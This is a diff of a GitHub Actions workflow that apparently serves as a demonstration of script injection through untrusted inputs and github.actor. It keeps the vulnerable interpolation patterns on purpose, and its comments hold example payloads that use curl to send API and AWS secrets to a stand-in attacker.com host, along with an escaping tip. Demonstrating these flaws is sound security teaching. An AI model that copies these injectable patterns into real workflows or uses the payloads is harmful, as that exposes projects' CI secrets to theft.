@@ -23,42 +23,23 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Configure Git (VULNERABLE PATTERN 1)
+      - name: "PATTERN 1: Untrusted GitHub Context (github.actor)"
         run: |
           git config user.name "${{ github.actor }}"
           git config user.email "${{ github.actor }}@users.noreply.github.com"
         # ⚠️ VULNERABLE: github.actor is untrusted and directly interpolated
+        # Can be manipulated by changing GitHub username before triggering workflow
 
-      - name: Create Branch (VULNERABLE PATTERN 2)
+      - name: "PATTERN 2: Command Injection (No Secrets Available)"
         continue-on-error: true
         run: |
-          git checkout -b "update-${{ inputs.package_name }}-${{ inputs.package_version }}"
-        # ⚠️ VULNERABLE: User inputs directly interpolated into shell command
-        # Attack example: package_name = 'foo"; curl https://attacker.com?secret=$DEMO_SECRET #'
+          echo "Processing package: ${{ inputs.package_name }}"
+          git checkout -b "update-${{ inputs.package_name }}-${{ inputs.package_version }}" || true
+        # ⚠️ VULNERABLE: Direct interpolation allows command injection
+        # Attack: package_name = '$(curl https://attacker.com?data=leaked)'
+        # Demonstrates injection works, but no secrets in this step's environment
 
-      - name: Update package info (VULNERABLE PATTERN 3)
-        continue-on-error: true
-        run: |
-          echo "Updating package: ${{ inputs.package_name }}"
-          echo "To version: ${{ inputs.package_version }}"
-          echo "Branch created successfully!"
-        # ⚠️ VULNERABLE: Echo commands can still leak data if injection succeeds
-
-      - name: Simulate package update (VULNERABLE PATTERN 4)
-        continue-on-error: true
-        run: |
-          echo "Running: npm install ${{ inputs.package_name }}@${{ inputs.package_version }}"
-          # In real scenario: npm install ${{ inputs.package_name }}@${{ inputs.package_version }}
-        # ⚠️ VULNERABLE: Package manager commands with untrusted input
-
-      - name: Create commit (VULNERABLE PATTERN 5)
-        continue-on-error: true
-        run: |
-          git add -A
-          git commit -m "Update ${{ inputs.package_name }} to ${{ inputs.package_version }}" || true
-        # ⚠️ VULNERABLE: Commit messages with untrusted input
-
-      - name: Send notification (VULNERABLE PATTERN 6 - Secret in Environment)
+      - name: "PATTERN 3: Secret Exfiltration (Secrets in env + Direct Interpolation)"
         continue-on-error: true
         env:
           API_TOKEN: ${{ secrets.DEMO_SECRET }}
@@ -66,23 +47,11 @@ jobs:
         run: |
           echo "Sending notification for package: ${{ inputs.package_name }}"
           echo "API Token available: ${API_TOKEN:0:10}..."
-          # In real scenario:
-          # curl -X POST "https://hooks.example.com/notify" \
-          #   -H "Authorization: Bearer $API_TOKEN" \
-          #   -d "package=${{ inputs.package_name }}"
-        # ⚠️ CRITICAL: Secrets in env: block, but input still uses direct interpolation
-        # Attack: package_name = '$(curl https://attacker.com?token=$API_TOKEN&aws=$AWS_KEY)'
-        # The command substitution can access secrets from env:
-
-      - name: AWS Deploy (VULNERABLE PATTERN 7 - Direct Secret in Command)
-        continue-on-error: true
-        run: |
-          echo "Deploying to S3 with region: ${{ inputs.package_version }}"
-          # In real scenario:
-          # aws s3 cp build/ s3://bucket-${{ inputs.package_name }}/ \
-          #   --access-key-id ${{ secrets.DEMO_AWS_KEY }} \
-          #   --region ${{ inputs.package_version }}
-        # ⚠️ CRITICAL: Secrets directly in command, injectable via bucket name or region
+          echo "AWS Key available: ${AWS_KEY:0:10}..."
+        # ⚠️ CRITICAL: Secrets in env + direct interpolation = exfiltration possible
+        # Attack: package_name = '$(curl "https://attacker.com?token=$API_TOKEN\&aws=$AWS_KEY")'
+        # Note: URL must be quoted and & must be escaped as \& to send both parameters
+        # Command substitution has full access to all environment variables in this step
 
       - name: Summary
         run: |
